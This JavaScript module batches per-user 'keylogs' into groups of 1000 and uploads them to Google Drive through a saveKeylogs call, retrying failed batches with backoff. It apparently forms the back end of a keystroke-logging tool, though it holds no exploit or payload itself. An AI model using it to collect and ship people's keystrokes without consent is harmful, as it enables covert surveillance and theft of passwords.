import GoogleDriveService from './googleDrive.js';

class BatchProcessor {
    constructor() {
        this.googleDriveService = new GoogleDriveService();
        this.batchSize = 1000; // Process 1000 logs at a time
        this.maxRetries = 3;
    }

    async processLargeDataset(username, logs) {
        console.log(`Processing ${logs.length} logs for user: ${username}`);
        
        const batches = this.createBatches(logs);
        console.log(`Created ${batches.length} batches of ${this.batchSize} logs each`);
        
        const results = [];
        
        for (let i = 0; i < batches.length; i++) {
            const batch = batches[i];
            console.log(`Processing batch ${i + 1}/${batches.length} with ${batch.length} logs`);
            
            try {
                const result = await this.processBatchWithRetry(username, batch, i + 1);
                results.push(result);
            } catch (error) {
                console.error(`Failed to process batch ${i + 1}:`, error);
                // Continue with other batches even if one fails
                results.push({ success: false, batchIndex: i + 1, error: error.message });
            }
        }
        
        const successCount = results.filter(r => r.success).length;
        console.log(`Successfully processed ${successCount}/${batches.length} batches`);
        
        return {
            totalBatches: batches.length,
            successfulBatches: successCount,
            results: results
        };
    }

    createBatches(logs) {
        const batches = [];
        for (let i = 0; i < logs.length; i += this.batchSize) {
            batches.push(logs.slice(i, i + this.batchSize));
        }
        return batches;
    }

    async processBatchWithRetry(username, batch, batchIndex) {
        for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
            try {
                await this.googleDriveService.saveKeylogs(username, batch);
                return { success: true, batchIndex, attempt };
            } catch (error) {
                console.error(`Batch ${batchIndex} attempt ${attempt} failed:`, error.message);
                if (attempt === this.maxRetries) {
                    throw error;
                }
                // Wait before retry (exponential backoff)
                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            }
        }
    }
}

export default BatchProcessor; 